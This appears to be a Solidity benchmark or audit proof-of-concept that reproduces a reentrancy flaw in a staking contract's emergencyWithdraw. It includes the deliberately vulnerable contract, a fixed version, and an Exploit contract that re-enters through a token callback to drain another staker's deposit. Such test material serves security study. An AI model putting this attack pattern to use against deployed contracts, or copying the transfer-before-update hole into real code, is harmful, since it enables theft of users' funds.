// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

/*
 * AuditVault 56308 — Stargate LPStaking.emergencyWithdraw (Zokyo, 2021-12).
 *
 * Quantstamp / the pre-fix LPStaking sent `user.amount` out with safeTransfer
 * and only then wrote `user.amount = 0`. The LP token notifies the recipient,
 * so the attacker re-enters emergencyWithdraw while amount is still the full
 * stake and pulls that amount again. There is also no check that the contract
 * is in an emergency.
 *
 * Victim stake 1_000 LP, attacker stake 100 LP. One re-entry pays the attacker
 * 200 LP. The extra 100 LP is the victim's. Fixed code zeroes amount first,
 * so the re-entered transfer pays 0.
 *
 * No cheatcodes. No warp inside run().
 */

contract LPToken {
    string public constant name = "STG-LP";
    string public constant symbol = "SLP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        _hook(to, msg.sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        _hook(to, from, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    function _hook(address to, address from, uint256 amount) internal {
        if (to.code.length > 0) {
            to.call(abi.encodeWithSignature("onLP(address,uint256)", from, amount));
        }
    }
}

contract LPStaking {
    struct UserInfo {
        uint256 amount;
        uint256 rewardDebt;
    }

    struct PoolInfo {
        LPToken lpToken;
    }

    PoolInfo[] public poolInfo;
    mapping(uint256 => mapping(address => UserInfo)) public userInfo;

    uint256 public deposits;
    uint256 public lpPulled;
    uint256 public emergencyCalls;
    uint256 public lastUserAmount;

    constructor(LPToken lp) {
        poolInfo.push(PoolInfo({lpToken: lp}));
    }

    function deposit(uint256 _pid, uint256 _amount) external {
        deposits += 1;
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        pool.lpToken.transferFrom(msg.sender, address(this), _amount);
        lpPulled += _amount;
        user.amount += _amount;
        user.rewardDebt = user.amount;
    }

    /// Pre-fix emergencyWithdraw: transfer, then zero. No emergency-status check.
    function emergencyWithdraw(uint256 _pid) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        uint256 userAmount = user.amount;
        lastUserAmount = userAmount;
        // @> VULN:
        pool.lpToken.transfer(address(msg.sender), userAmount);
        user.amount = 0;
        user.rewardDebt = 0;
        emergencyCalls += 1;
    }
}

contract LPStakingFixed {
    struct UserInfo {
        uint256 amount;
        uint256 rewardDebt;
    }

    struct PoolInfo {
        LPToken lpToken;
    }

    PoolInfo[] public poolInfo;
    mapping(uint256 => mapping(address => UserInfo)) public userInfo;

    constructor(LPToken lp) {
        poolInfo.push(PoolInfo({lpToken: lp}));
    }

    function deposit(uint256 _pid, uint256 _amount) external {
        UserInfo storage user = userInfo[_pid][msg.sender];
        poolInfo[_pid].lpToken.transferFrom(msg.sender, address(this), _amount);
        user.amount += _amount;
    }

    function emergencyWithdraw(uint256 _pid) public {
        UserInfo storage user = userInfo[_pid][msg.sender];
        uint256 userAmount = user.amount;
        user.amount = 0;
        user.rewardDebt = 0;
        poolInfo[_pid].lpToken.transfer(address(msg.sender), userAmount);
    }
}

contract Victim {
    function fund(LPStaking staking, LPToken lp, uint256 amount) external {
        lp.approve(address(staking), amount);
        staking.deposit(0, amount);
    }

    function fundFixed(LPStakingFixed staking, LPToken lp, uint256 amount) external {
        lp.approve(address(staking), amount);
        staking.deposit(0, amount);
    }
}

contract Reenterer {
    uint256 public rounds;
    LPToken public lp;
    LPStakingFixed public staking;

    function poke(LPStakingFixed s, LPToken token, uint256 amount) external {
        lp = token;
        staking = s;
        token.approve(address(s), amount);
        s.deposit(0, amount);
        s.emergencyWithdraw(0);
    }

    function onLP(address, uint256) external {
        if (address(lp) == address(0) || msg.sender != address(lp)) return;
        if (rounds >= 1) return;
        rounds += 1;
        staking.emergencyWithdraw(0);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 public constant VICTIM_STAKE = 1_000 ether;
    uint256 public constant ATTACK_STAKE = 100 ether;

    LPToken public lp;
    LPStaking public staking;
    Victim public victim;

    uint256 public rounds;
    uint256 public received;
    uint256 public stolen;

    function run() external {
        lp = new LPToken();
        staking = new LPStaking(lp);
        victim = new Victim();

        lp.mint(address(victim), VICTIM_STAKE);
        victim.fund(staking, lp, VICTIM_STAKE);

        lp.mint(address(this), ATTACK_STAKE);
        lp.approve(address(staking), ATTACK_STAKE);
        staking.deposit(0, ATTACK_STAKE);
        staking.emergencyWithdraw(0);

        received = lp.balanceOf(address(this));
        require(received == ATTACK_STAKE * 2, "double withdraw");
        stolen = received - ATTACK_STAKE;
        lp.transfer(ATTACKER, stolen);
        require(lp.balanceOf(ATTACKER) == stolen, "profit");
        require(lp.balanceOf(address(staking)) == VICTIM_STAKE - stolen, "pool short");
    }

    function onLP(address, uint256) external {
        if (msg.sender != address(lp)) return;
        if (rounds >= 1) return;
        rounds += 1;
        staking.emergencyWithdraw(0);
    }
}
